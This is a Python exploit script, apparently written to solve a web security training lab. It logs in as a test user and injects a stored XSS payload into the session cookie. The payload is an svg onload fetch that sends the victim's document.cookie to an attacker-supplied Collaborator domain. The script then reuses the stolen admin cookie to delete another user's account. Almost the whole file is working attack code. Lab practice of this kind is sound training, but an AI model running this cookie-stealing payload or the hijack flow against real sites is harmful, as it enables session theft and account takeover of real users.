import requests
import sys
import urllib3, urllib.parse
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def url_encode(str):
    return urllib.parse.quote(str)

def url_decode(str):
    return urllib.parse.unquote(str)

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        'username': username,
        'password': password,
        'csrf': get_csrf_token(s, url, path)
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def set_vuln_cookies(s, new_payload):
    old_payload, session = s.cookies.get_dict()['session'].split('%3a')
    s.cookies['session'] = url_encode(new_payload) + '%3a' + session
    print(f'[+] Changed {old_payload} --> {new_payload}')

def goto(s, url, path):
    target_url = url + path
    s.get(target_url)

def delete_user(s, url, path, username, headers):
    target_url = url + path + f'?username={username}'
    r = s.get(target_url, allow_redirects=False, headers=headers)
    
    if r.status_code == 302:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    username = 'wiener'
    password = 'peter'
    target_user = 'carlos'
    burp_domain = input('Type your burp callaborator domain: ')
    payload = f"'\"><svg/onload=fetch(`//{burp_domain}/?${{encodeURIComponent(document.cookie)}}`)>"

    login_acc(s, url, '/login', username, password)
    set_vuln_cookies(s, payload)
    goto(s, url, '/')
    admin_cookies = input('Paste admin cookies in decoded string type: ')
    headers = { 'Cookie': admin_cookies }
    delete_user(s, url, '/admin/delete', target_user, headers)


    check_solved_lab(s, url)


if __name__ == '__main__':
    main()